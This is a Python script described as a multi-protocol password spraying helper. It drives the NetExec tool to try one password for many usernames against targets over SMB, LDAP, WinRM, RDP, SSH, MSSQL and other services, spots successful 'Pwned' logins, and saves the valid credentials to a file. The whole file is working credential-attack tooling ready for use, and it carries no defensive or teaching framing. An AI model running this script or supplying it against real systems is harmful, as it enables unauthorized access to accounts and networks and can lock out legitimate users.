#!/usr/bin/env python3
import argparse
import subprocess
import sys
import time
from pathlib import Path
from datetime import datetime

ALL_PROTOCOLS = [
    "ftp",
    "smb",
    "ldap",
    "winrm",
    "nfs",
    "vnc",
    "mssql",
    "ssh",
    "rdp",
    "wmi",
]

def load_list(value):
    if not value:
        return []
    if Path(value).is_file():
        return [line.strip() for line in open(value) if line.strip()]
    return [value]

def run_nxc(proto, target, user, password, local_auth):
    cmd = [
        "nxc",
        proto,
        target,
        "-u", user,
        "-p", password
    ]

    if local_auth:
        cmd.append("--local-auth")

    print(f"[+] Running: {' '.join(cmd)}")
    return subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

def extract_success(output):
    indicators = ["[+]", "Pwned", "SUCCESS"]
    return any(ind in output for ind in indicators)

def explain_failure(output):
    explanations = []

    if "ADMIN$" in output:
        explanations.append(
            "SMB auth succeeded but admin access blocked (likely UAC token filtering)"
        )
    if "STATUS_LOGON_FAILURE" in output:
        explanations.append("Invalid credentials")
    if "STATUS_ACCOUNT_LOCKED_OUT" in output:
        explanations.append("Account locked out")
    if "Connection refused" in output:
        explanations.append("Service not reachable")

    return explanations

def main():
    parser = argparse.ArgumentParser(
        description="NetExec multi-protocol password spraying helper"
    )

    parser.add_argument(
        "protocols",
        help="Comma-separated protocols or 'all' (e.g. smb,ldap or all)"
    )
    parser.add_argument(
        "target",
        help="Target IP or file containing targets"
    )
    parser.add_argument(
        "-u", "--user",
        help="Single username"
    )
    parser.add_argument(
        "-U", "--userfile",
        help="File containing usernames"
    )
    parser.add_argument(
        "-p", "--password",
        required=True,
        help="Password to spray"
    )
    parser.add_argument(
        "--local-auth",
        action="store_true",
        help="Use local authentication"
    )
    parser.add_argument(
        "--delay",
        type=int,
        default=0,
        help="Delay in seconds between attempts"
    )
    parser.add_argument(
        "--explain",
        action="store_true",
        help="Explain common failure reasons"
    )

    args = parser.parse_args()

    if not args.user and not args.userfile:
        print("[-] Must supply -u or -U")
        sys.exit(1)

    # Protocol handling
    if args.protocols == "all":
        protocols = ALL_PROTOCOLS
    else:
        protocols = [p.strip() for p in args.protocols.split(",")]
        invalid = set(protocols) - set(ALL_PROTOCOLS)
        if invalid:
            print(f"[-] Invalid protocol(s): {', '.join(invalid)}")
            sys.exit(1)

    targets = load_list(args.target)
    users = load_list(args.userfile) if args.userfile else [args.user]

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    logfile = f"spray_{timestamp}.log"
    credsfile = f"valid_creds_{timestamp}.txt"

    valid_creds = []

    print(f"[+] Users     : {len(users)}")
    print(f"[+] Targets   : {len(targets)}")
    print(f"[+] Protocols : {', '.join(protocols)}")
    print(f"[+] Delay     : {args.delay}s")
    print(f"[+] Log file  : {logfile}\n")

    for user in users:
        for proto in protocols:
            print(f"[+] === Protocol: {proto} | User: {user} ===")
            for target in targets:
                result = run_nxc(
                    proto,
                    target,
                    user,
                    args.password,
                    args.local_auth
                )

                output = result.stdout + result.stderr

                with open(logfile, "a") as log:
                    log.write(output + "\n")

                if extract_success(output):
                    entry = f"{proto} {target} {user}:{args.password}"
                    valid_creds.append(entry)
                    print(f"[!] VALID → {entry}")

                elif args.explain:
                    reasons = explain_failure(output)
                    for r in reasons:
                        print(f"[i] {r}")

                if args.delay > 0:
                    time.sleep(args.delay)

    if valid_creds:
        with open(credsfile, "w") as f:
            f.write("\n".join(valid_creds))
        print(f"\n[+] Valid credentials saved to {credsfile}")
    else:
        print("\n[-] No valid credentials found")

if __name__ == "__main__":
    main()